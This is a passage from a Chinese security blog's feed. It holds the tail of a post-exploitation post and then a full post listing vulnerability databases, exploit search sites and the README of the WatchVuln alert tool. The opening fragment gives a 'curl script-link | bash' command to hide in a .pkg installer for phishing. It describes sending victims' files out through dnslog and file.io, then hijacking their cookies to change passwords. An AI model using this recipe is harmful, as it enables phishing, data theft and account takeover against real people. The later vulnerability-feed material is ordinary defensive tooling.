~/Downloads/google</span><br></pre></td></tr></table></figure><p>这里取决于你想不想把文件给发送回来，如果是钓鱼的话，还是要发送回来的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;你的脚本链接&quot;</span> |bash -s -- 你的dnslog地址</span><br></pre></td></tr></table></figure><p>然后打包一个pkg安装包，把这个放进去就可以进行钓鱼了。准备好你的sh远程地址和dnslog地址就行。 当然你也可以直接加上上线的命令。直接就一劳永逸。</p><h4 id="信息收集的思路："><a href="#信息收集的思路：" class="headerlink" title="信息收集的思路："></a>信息收集的思路：</h4><p>直接进去无文件落地+cos一分钟有效授权就开了弄</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;你的脚本链接&quot;</span> |bash -s -- 你的dnslog地址</span><br></pre></td></tr></table></figure><p>然后你会在dnslog看到你的文件链接。直接<a href="https://file.io/+%E4%BD%A0%E7%9A%84%E6%96%87%E4%BB%B6%E9%93%BE%E6%8E%A5">https://file.io/+你的文件链接</a></p><p><img src="/google/f2274642/img_4.png"></p><p>然后你就可以拿到cookie了。筛选后用Cookie Editor,上去看看他能干啥，修改个密码啥的。你想干啥就干啥</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="后利用" scheme="http://example.com/categories/%E5%90%8E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="浏览器记录提取" scheme="http://example.com/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%B0%E5%BD%95%E6%8F%90%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>如何快速检索最新的高可用漏洞</title>
    <link href="http://example.com/google/e9dbc322.html"/>
    <id>http://example.com/google/e9dbc322.html</id>
    <published>2024-09-19T14:10:24.000Z</published>
    <updated>2024-09-19T15:05:40.090Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="sRgC6">漏洞库：</h1><h2 id="XfztN"><font style="color:rgb(100, 100, 109);">阿里云漏洞库</font></h2><font style="color:rgb(100, 100, 109);"> </font>[https://avd.aliyun.com/](https://avd.aliyun.com/)<p><img src="/google/e9dbc322/img.png"></p><h2 id="CNKky">CISA kev</h2>[https://www.cisa.gov/known-exploited-vulnerabilities-catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)<p><img src="/google/e9dbc322/img_1.png"></p><p>目前这两个库是最新的可利用的漏洞</p><p>微软&#x2F;CVE&#x2F;ZOOM这些库也可以根据自己的需要进行自定义的选取</p><h2 id="kQmqd">微软漏洞列表</h2>[Security Update Guide - Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability)<h2 id="dRH8O">zoom漏洞列表</h2>[Security Bulletins | Zoom](https://explore.zoom.us/en/trust/security/security-bulletin/?filter-cve=&filter=&keywords=)<h2 id="Tclq1">谷歌漏洞列表</h2>[https://cloud.google.com/support/bulletins?hl=zh-cn#gcp-2022-026](https://cloud.google.com/support/bulletins?hl=zh-cn#gcp-2022-026)<h2 id="NFiWP">CNVD漏洞列表（有创宇盾很烦）</h2>[https://www.cnvd.org.cn/flaw/list?max=20&offset=](https://www.cnvd.org.cn/flaw/list?max=20&offset=)<h2 id="Wg919">hackerone漏洞列表</h2>[HackerOne](https://hackerone.com/hacktivity?from_wecom=1)<h2 id="svPxV">CVE热点</h2>[CVE Trends - crowdsourced CVE intel](https://cvetrends.com/)<h1 id="qTNf5">EXP&POC</h1><p>注意：这里的poc和exp都是github上的，所以有漏的和错误的</p><h2 id="Kx1sA">POC库：</h2>[https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)<p>这里有api和rss 依据CVE就可以搜索</p><h2 id="tlzEm">EXP库：</h2>[https://github.com/nomi-sec/NVD-Exploit-List-Ja](https://github.com/nomi-sec/NVD-Exploit-List-Ja)<p>这里只是存储库，不好检索</p><h2 id="DjCqq">其他EXP&POC的搜索平台：</h2>[TOP8的exp库](https://securitytrails.com/blog/top-exploit-databases)<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https://sploitus.com/</span><br><span class="line">https://vulmon.com/searchpage?q=CVE-2021-1732&amp;sortby=byrelevance</span><br><span class="line">https://github.com/helloexp/0day</span><br><span class="line">https://vuldb.com/zh/?search</span><br><span class="line">https://packetstormsecurity.com/files/tags/exploit/?rel=nofollow,noopener,noreferrer&amp;target=_blank</span><br><span class="line">https://cn.0day.today/</span><br><span class="line">https://vulners.com/</span><br><span class="line">https://www.rapid7.com/db/</span><br><span class="line">https://cxsecurity.com/exploit/?rel=nofollow,noopener,noreferrer&amp;target=_blank</span><br><span class="line">https://www.exploit-db.com/</span><br></pre></td></tr></table></figure><p>当然谷歌也是快速搜集的一个渠道。</p><h2 id="自动化漏洞情报收集"><a href="#自动化漏洞情报收集" class="headerlink" title="自动化漏洞情报收集"></a>自动化漏洞情报收集</h2><h3 id="推荐长亭zema1大佬的项目："><a href="#推荐长亭zema1大佬的项目：" class="headerlink" title="推荐长亭zema1大佬的项目："></a>推荐长亭zema1大佬的项目：</h3><p><a href="https://github.com/zema1/watchvuln">watchvul</a></p><h1 id="WatchVuln-高价值漏洞采集与推送"><a href="#WatchVuln-高价值漏洞采集与推送" class="headerlink" title="WatchVuln 高价值漏洞采集与推送"></a>WatchVuln 高价值漏洞采集与推送</h1><p>众所周知，CVE 漏洞库中 99% 以上的漏洞只是无现实意义的编号。我想集中精力看下当下需要关注的高价值漏洞有哪些，而不是被各类 RSS<br>和公众号的 <del>威胁情报</del> 淹没。 于是写了这个小项目来抓取部分高质量的漏洞信息源然后做推送。 <code>WatchVuln</code>意为<strong>监测</strong><br>漏洞更新，同时也表示这些漏洞需要<strong>注意</strong>。</p><p>当前抓取了这几个站点的数据:</p><table><thead><tr><th>名称</th><th>地址</th><th>推送策略</th></tr></thead><tbody><tr><td>阿里云漏洞库</td><td><a href="https://avd.aliyun.com/high-risk/list">https://avd.aliyun.com/high-risk/list</a></td><td>等级为高危或严重</td></tr><tr><td>OSCS开源安全情报预警</td><td><a href="https://www.oscs1024.com/cm">https://www.oscs1024.com/cm</a></td><td>等级为高危或严重<strong>并且</strong>包含 <code>预警</code> 标签</td></tr><tr><td>奇安信威胁情报中心</td><td><a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></td><td>等级为高危严重<strong>并且</strong>包含 <code>奇安信CERT验证</code> <code>POC公开</code> <code>技术细节公布</code>标签之一</td></tr><tr><td>微步在线研究响应中心(公众号)</td><td><a href="https://x.threatbook.com/v5/vulIntelligence">https://x.threatbook.com/v5/vulIntelligence</a></td><td>等级为高危或严重</td></tr><tr><td>知道创宇Seebug漏洞库</td><td><a href="https://www.seebug.org/">https://www.seebug.org/</a></td><td>等级为高危或严重</td></tr><tr><td>CISA KEV</td><td><a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">https://www.cisa.gov/known-exploited-vulnerabilities-catalog</a></td><td>全部推送</td></tr><tr><td>Struts2 Security Bulletins</td><td><a href="https://cwiki.apache.org/confluence/display/WW/Security+Bulletins">Struts2 Security Bulletins</a></td><td>等级为高危或严重</td></tr></tbody></table><blockquote><p>所有信息来自网站公开页面, 如果有侵权，请提交 issue, 我会删除相关源。</p><p>如果有更好的信息源也可以反馈给我，需要能够响应及时 &amp; 有办法过滤出有价值的漏洞</p></blockquote><p>具体来说，消息的推送有两种情况, 两种情况有内置去重，不会重复推送:</p><ul><li>新建的漏洞符合推送策略，直接推送,</li><li>新建的漏洞不符合推送策略，但漏洞信息被更新后符合了推送策略，也会被推送</li></ul><p><img src="/google/e9dbc322/img_3.png" alt="app"></p><h2 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h2><p>支持下列推送方式:</p><ul><li><a href="https://open.dingtalk.com/document/robots/custom-robot-access">钉钉群组机器人</a></li><li><a href="https://open.work.weixin.qq.com/help2/pc/14931">微信企业版群组机器人</a></li><li><a href="https://open.feishu.cn/document/ukTMukTMukTM/ucTM5YjL3ETO24yNxkjN">飞书群组机器人</a></li><li><a href="https://core.telegram.org/bots/tutorial">Telegram Bot</a></li><li><a href="https://sct.ftqq.com/">Server 酱</a></li><li><a href="https://github.com/Finb/Bark">自定义 Bark 服务</a></li><li><a href="./examples/webhook">自定义 Webhook 服务</a></li><li><a href="https://pushplus.plus/">pushplus</a></li><li><a href="https://developer.lanxin.cn/official/article?id=646ecae03d4e4adb7039c0e4&module=development-help&article_id=646f193b3d4e4adb7039c21c">蓝信</a></li></ul><h3 id="使用-Docker"><a href="#使用-Docker" class="headerlink" title="使用 Docker"></a>使用 Docker</h3><p>Docker 方式推荐使用环境变量来配置服务参数</p><table><thead><tr><th>环境变量名</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr><td><code>DB_CONN</code></td><td>数据库链接字符串，详情见 <a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5">数据库连接</a></td><td><code>sqlite3://vuln_v3.sqlite3</code></td></tr><tr><td><code>DINGDING_ACCESS_TOKEN</code></td><td>钉钉机器人 url 的 <code>access_token</code> 部分</td><td></td></tr><tr><td><code>DINGDING_SECRET</code></td><td>钉钉机器人的加签值 （仅支持加签方式）</td><td></td></tr><tr><td><code>LARK_ACCESS_TOKEN</code></td><td>飞书机器人 url 的 <code>/open-apis/bot/v2/hook/</code> 后的部分, 也支持直接指定完整的 url 来访问私有部署的飞书</td><td></td></tr><tr><td><code>LARK_SECRET</code></td><td>飞书机器人的加签值 （仅支持加签方式）</td><td></td></tr><tr><td><code>WECHATWORK_KEY </code></td><td>微信机器人 url 的 <code>key</code> 部分</td><td></td></tr><tr><td><code>SERVERCHAN_KEY </code></td><td>Server酱的 <code>SCKEY</code></td><td></td></tr><tr><td><code>WEBHOOK_URL</code></td><td>自定义 webhook 服务的完整 url</td><td></td></tr><tr><td><code>BARK_URL</code></td><td>Bark 服务的完整 url, 路径需要包含 DeviceKey</td><td></td></tr><tr><td><code>PUSHPLUS_KEY</code></td><td>PushPlus的token</td><td></td></tr><tr><td><code>LANXIN_DOMAIN</code></td><td>蓝信webhook机器人的域名</td><td></td></tr><tr><td><code>LANXIN_TOKEN</code></td><td>蓝信webhook机器人的hook token</td><td></td></tr><tr><td><code>LANXIN_SECRET</code></td><td>蓝信webhook机器人的签名</td><td></td></tr><tr><td><code>TELEGRAM_BOT_TOKEN</code></td><td>Telegram Bot Token</td><td></td></tr><tr><td><code>TELEGRAM_CHAT_IDS</code></td><td>Telegram Bot 需要发送给的 chat 列表，使用 <code>,</code> 分割</td><td></td></tr><tr><td><code>SOURCES</code></td><td>启用哪些漏洞信息源，逗号分隔, 可选 <code>avd</code>, <code>ti</code>, <code>oscs</code>, <code>seebug</code>,<code>threatbook</code>,<code>struts2</code></td><td><code>avd,ti,oscs,threatbook,seebug,struts2</code></td></tr><tr><td><code>INTERVAL</code></td><td>检查周期，支持秒 <code>60s</code>, 分钟 <code>10m</code>, 小时 <code>1h</code>, 最低 <code>1m</code></td><td><code>30m</code></td></tr><tr><td><code>ENABLE_CVE_FILTER</code></td><td>启用 CVE 过滤，开启后多个数据源的统一 CVE 将只推送一次</td><td><code>true</code></td></tr><tr><td><code>NO_FILTER</code></td><td>禁用上述推送过滤策略，所有新发现的漏洞都会被推送</td><td><code>false</code></td></tr><tr><td><code>NO_START_MESSAGE</code></td><td>禁用服务启动的提示信息</td><td><code>false</code></td></tr><tr><td><code>WHITELIST_FILE</code></td><td>指定推送漏洞的白名单列表文件, 详情见 <a href="#%E6%8E%A8%E9%80%81%E5%86%85%E5%AE%B9%E7%AD%9B%E9%80%89">推送内容筛选</a></td><td></td></tr><tr><td><code>BLACKLIST_FILE</code></td><td>指定推送漏洞的黑名单列表文件, 详情见 <a href="#%E6%8E%A8%E9%80%81%E5%86%85%E5%AE%B9%E7%AD%9B%E9%80%89">推送内容筛选</a></td><td></td></tr><tr><td><code>DIFF</code></td><td>跳过初始化阶段，转而直接检查漏洞更新并推送</td><td></td></tr><tr><td><code>HTTPS_PROXY</code></td><td>给所有请求配置代理, 详情见 <a href="#%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86">配置代理</a></td><td></td></tr></tbody></table><p>比如使用钉钉机器人</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart always -d \</span><br><span class="line">  -e DINGDING_ACCESS_TOKEN=xxxx \</span><br><span class="line">  -e DINGDING_SECRET=xxxx \</span><br><span class="line">  -e INTERVAL=30m \</span><br><span class="line">  -e ENABLE_CVE_FILTER=<span class="literal">true</span> \</span><br><span class="line">  zemal/watchvuln:latest</span><br></pre></td></tr></table></figure><p>当然，你可以仓靠使用本仓库的 <code>docker-compose.yaml</code> 文件，使用 <code>docker-compose</code> 来启动容器。</p><p>每次更新记得重新拉镜像:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull zemal/watchvuln:latest</span><br></pre></td></tr></table></figure><details><summary>使用飞书机器人</summary><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart always -d \</span><br><span class="line">  -e LARK_ACCESS_TOKEN=xxxx \</span><br><span class="line">  -e LARK_SECRET=xxxx \</span><br><span class="line">  -e INTERVAL=30m \</span><br><span class="line">  zemal/watchvuln:latest</span><br></pre></td></tr></table></figure></details><details><summary>使用企业微信机器人</summary><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart always -d \</span><br><span class="line">  -e WECHATWORK_KEY=xxxx \</span><br><span class="line">  -e INTERVAL=30m \</span><br><span class="line">  zemal/watchvuln:latest</span><br></pre></td></tr></table></figure></details><details><summary>使用PushPlus</summary><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart always -d \</span><br><span class="line">  -e PUSHPLUS_KEY=xxx \</span><br><span class="line">  -e INTERVAL=30m \</span><br><span class="line">  zemal/watchvuln:latest</span><br></pre></td></tr></table></figure></details><details><summary>使用蓝信Webhook机器人</summary><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart always -d \</span><br><span class="line">  -e LANXIN_DOMAIN=xxx \</span><br><span class="line">  -e LANXIN_TOKEN=xxx \</span><br><span class="line">  -e LANXIN_SECRET=xxx \</span><br><span class="line">  -e INTERVAL=30m \</span><br><span class="line">  zemal/watchvuln:latest</span><br></pre></td></tr></table></figure></details><details><summary>使用Telegram 机器人</summary><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart always -d \</span><br><span class="line">  -e TELEGRAM_BOT_TOKEN=xxx \</span><br><span class="line">  -e TELEGRAM_CHAT_IDS=1111,2222 \</span><br><span class="line">  -e INTERVAL=30m \</span><br><span class="line">  zemal/watchvuln:latest</span><br></pre></td></tr></table></figure></details><details><summary>使用自定义 Bark 服务</summary><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart always -d \</span><br><span class="line">  -e BARK_URL=http://xxxx \</span><br><span class="line">  -e INTERVAL=30m \</span><br><span class="line">  zemal/watchvuln:latest</span><br></pre></td></tr></table></figure></details><details><summary>使用自定义 Webhook 服务</summary><p>通过自定义一个 webhook server，可以方便的接入其他服务, 实现方式可以参考: <a href="./examples/webhook">example</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart always -d \</span><br><span class="line">  -e WEBHOOK_URL=http://xxx \</span><br><span class="line">  -e INTERVAL=30m \</span><br><span class="line">  zemal/watchvuln:latest</span><br></pre></td></tr></table></figure></details><details><summary>使用server酱机器人</summary><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart always -d \</span><br><span class="line">  -e SERVERCHAN_KEY=xxxx \</span><br><span class="line">  -e INTERVAL=30m \</span><br><span class="line">  zemal/watchvuln:latest</span><br></pre></td></tr></table></figure></details><details><summary>使用多种服务</summary><p>如果配置了多种服务的密钥，那么每个服务都会生效， 比如使用钉钉和企业微信:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run --restart always -d \</span><br><span class="line">  -e DINGDING_ACCESS_TOKEN=xxxx \</span><br><span class="line">  -e DINGDING_SECRET=xxxx \</span><br><span class="line">  -e WECHATWORK_KEY=xxxx \</span><br><span class="line">  -e INTERVAL=30m \</span><br><span class="line">  zemal/watchvuln:latest</span><br></pre></td></tr></table></figure></details><p>初次运行会在本地建立全量数据库，大约需要 1 分钟，可以使用 <code>docker logs -f [containerId]</code> 来查看进度,<br>完成后会在群内收到一个提示消息，表示服务已经在正常运行了。</p><h3 id="使用二进制"><a href="#使用二进制" class="headerlink" title="使用二进制"></a>使用二进制</h3><p>前往 Release 下载对应平台的二进制，然后在命令行执行。命令行参数请参考 Docker 环境变量部分的说明，可以一一对应。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">USAGE:</span><br><span class="line">   watchvuln [global options] <span class="built_in">command</span> [<span class="built_in">command</span> options] [arguments...]</span><br><span class="line"></span><br><span class="line">GLOBAL OPTIONS:</span><br><span class="line">   [Push Options]</span><br><span class="line"></span><br><span class="line">   --bark-url value, --bark value             your bark server url, ex: http://127.0.0.1:1111/DeviceKey</span><br><span class="line">   --dingding-access-token value, --dt value  webhook access token of dingding bot</span><br><span class="line">   --dingding-sign-secret value, --ds value   sign secret of dingding bot</span><br><span class="line">   --lanxin-domain value, --lxd value         your lanxin server url, ex: https://apigw-example.domain</span><br><span class="line">   --lanxin-hook-token value, --lxt value     lanxin hook token</span><br><span class="line">   --lanxin-sign-secret value, --lxs value    sign secret of lanxin</span><br><span class="line">   --lark-access-token value, --lt value      webhook access token/url of lark</span><br><span class="line">   --lark-sign-secret value, --<span class="built_in">ls</span> value       sign secret of lark</span><br><span class="line">   --pushplus-key value, --pk value           send key <span class="keyword">for</span> push plus</span><br><span class="line">   --serverchan-key value, --sk value         send key <span class="keyword">for</span> server chan</span><br><span class="line">   --telegram-bot-token value, --tgtk value   telegram bot token, ex: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11</span><br><span class="line">   --telegram-chat-ids value, --tgids value   chat ids want to send on telegram, ex: 123456,4312341,123123</span><br><span class="line">   --webhook-url value, --webhook value       your webhook server url, ex: http://127.0.0.1:1111/webhook</span><br><span class="line">   --wechatwork-key value, --wk value         webhook key of wechat work</span><br><span class="line"></span><br><span class="line">   [Launch Options]</span><br><span class="line"></span><br><span class="line">   --db-conn value, --db value  database connection string (default: <span class="string">&quot;sqlite3://vuln_v3.sqlite3&quot;</span>)</span><br><span class="line">   --enable-cve-filter          <span class="built_in">enable</span> a filter that vulns from multiple sources with same cve <span class="built_in">id</span> will be sent only once (default: <span class="literal">true</span>)</span><br><span class="line">   --interval value, -i value   checking every [interval], supported format like 30s, 30m, 1h (default: <span class="string">&quot;30m&quot;</span>)</span><br><span class="line">   --no-filter, --nf            ignore the valuable filter and push all discovered vulns (default: <span class="literal">false</span>)</span><br><span class="line">   --no-github-search, --ng     don<span class="string">&#x27;t search github repos and pull requests for every cve vuln (default: false)</span></span><br><span class="line"><span class="string">   --no-start-message, --nm     disable the hello message when server starts (default: false)</span></span><br><span class="line"><span class="string">   --proxy value, -x value      set request proxy, support socks5://xxx or http(s)://</span></span><br><span class="line"><span class="string">   --sources value, -s value    set vuln sources (default: &quot;avd,nox,oscs,threatbook,seebug,struts2&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   [Other Options]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   --debug, -d    set log level to debug, print more details (default: false)</span></span><br><span class="line"><span class="string">   --help, -h     show help (default: false)</span></span><br><span class="line"><span class="string">   --version, -v  print the version (default: false)</span></span><br></pre></td></tr></table></figure><p>在参数中指定相关 Token 即可, 比如使用钉钉机器人</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./watchvuln --dt DINGDING_ACCESS_TOKEN --ds DINGDING_SECRET -i 30m</span><br></pre></td></tr></table></figure><details><summary>使用飞书机器人</summary><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./watchvuln --lt LARK_ACCESS_TOKEN --<span class="built_in">ls</span> LARK_SECRET -i 30m</span><br></pre></td></tr></table></figure></details><details><summary>使用企业微信机器人</summary><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./watchvuln --wk WECHATWORK_KEY -i 30m</span><br></pre></td></tr></table></figure></details><details><summary>使用server酱机器人</summary><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./watchvuln --sk xxxx -i 30m</span><br></pre></td></tr></table></figure></details><details><summary>使用PushPlus</summary><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./watchvuln --pk xxxx -i 30m</span><br></pre></td></tr></table></figure></details><details><summary>使用蓝信Webhook机器人</summary><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./watchvuln --lxd xxxx --lxt xxx --lxs xxx -i 30m</span><br></pre></td></tr></table></figure></details><details><summary>使用Telegram 机器人</summary><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./watchvuln --tgtk xxxx --tgids 1111,2222 -i 30m</span><br></pre></td></tr></table></figure></details><details><summary>使用自定义 Bark 服务</summary><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./watchvuln --bark http://xxxx -i 30m</span><br></pre></td></tr></table></figure></details><details><summary>使用自定义 Webhook 服务</summary><p>通过自定义一个 webhook server，可以方便的接入其他服务, 实现方式可以参考: <a href="./examples/webhook">example</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./watchvuln --webhook http://xxxx -i 30m</span><br></pre></td></tr></table></figure></details><details><summary>使用多种服务</summary><p>如果配置了多种服务的密钥，那么每个服务都会生效， 比如使用钉钉和企业微信:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./watchvuln --dt DINGDING_ACCESS_TOKEN --ds DINGDING_SECRET --wk WECHATWORK_KEY -i 30m</span><br></pre></td></tr></table></figure></details><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>进入查看详情 <a href="CONFIG.md">使用配置文件</a></p><h2 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h2><p>默认使用 sqlite3 作为数据库，数据库文件为 <code>vuln_v3.sqlite3</code>，如果需要使用其他数据库，可以通过 <code>--db</code><br>参数或是环境变量 <code>DB_CONN</code> 指定连接字符串，当前支持的数据库有:</p><ul><li><code>sqlite3://filename</code></li><li><code>mysql://user:pass@host:port/dbname</code></li><li><code>postgres://user:pass@host:port/dbname</code></li></ul><p>注意：该项目不做数据向后兼容保证，版本升级可能存在数据不兼容的情况，如果报错需要删库重来。</p><h2 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h2><p>watchvuln 支持配置上游代理来绕过网络限制，支持两种方式:</p><ul><li>环境变量 <code>HTTPS_PROXY</code></li><li>命令行参数 <code>--proxy</code>&#x2F;<code>-x</code></li></ul><p>支持 <code>socks5://xxxx</code> 或者 <code>http(s)://xxkx</code> 两种代理形式。</p><h2 id="推送内容筛选"><a href="#推送内容筛选" class="headerlink" title="推送内容筛选"></a>推送内容筛选</h2><p>如果你只想推送某些产品的漏洞，可以通过配置白名单或者黑名单来实现。这两个参数传入的都是一个文件，文件格式为每行一个产品名，比如:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Apache</span><br><span class="line">泛微</span><br></pre></td></tr></table></figure><p>温馨提示：如果你使用 <code>Docker</code> 来运行，可以通过挂载目录的方式将文件映射到容器内，比如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Apache&quot;</span> &gt; whitelist.txt</span><br><span class="line"></span><br><span class="line">docker run -v $(<span class="built_in">pwd</span>):/config \</span><br><span class="line">  -e WHITELIST_FILE=/config/whitelist.txt \</span><br><span class="line">  -e xxxx=xxxxx</span><br><span class="line">  zemal/watchvuln:latest</span><br></pre></td></tr></table></figure><h3 id="白名单过滤"><a href="#白名单过滤" class="headerlink" title="白名单过滤"></a>白名单过滤</h3><p>通过命令行参数 <code>-wf</code> 或者环境变量 <code>WHITELIST_FILE</code> 来指定白名单文件。在发现新漏洞时，将检查漏洞的 <strong>标题</strong> 和 <strong>描述</strong><br>是否包含白名单的任意一行，全都不在的将不推送漏洞。</p><h3 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h3><p>通过命令行参数 <code>-bf</code> 或者环境变量 <code>BLACKLIST_FILE</code> 来指定黑名单文件。在发现新漏洞时，将检查漏洞的 <strong>标题</strong> 是否包含黑名单的任意一行，<br>包含的将不推送漏洞。为了避免非预期的漏掉推送，黑名单<strong>不会</strong>检查漏洞的 <strong>描述</strong> 是否匹配。</p><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><ol><li><p>服务重启后支持增量更新吗</p><p>支持，每次检查会按照一定的策略去增量抓取</p></li><li><p>Docker 拉取镜像提示 <code>not found</code></p><p>你使用的 Docker 版本太老了，不支持新的镜像格式，需要升级一下 Docker<br>版本，参考 <a href="https://github.com/zema1/watchvuln/issues/16">#16</a></p></li></ol><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>为了减少内卷，该工具在 00:00 到 07:00 间会去 sleep 不会运行, 请确保你的服务器是正确的时间！</p><p>扫码加我拉进讨论群，请备注申请理由为：问题反馈与讨论，否则不通过</p><p><img src="https://user-images.githubusercontent.com/20637881/229296623-24a7cc5d-8f33-4120-ae77-bbe2610ce5bb.jpg" alt="wechat"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
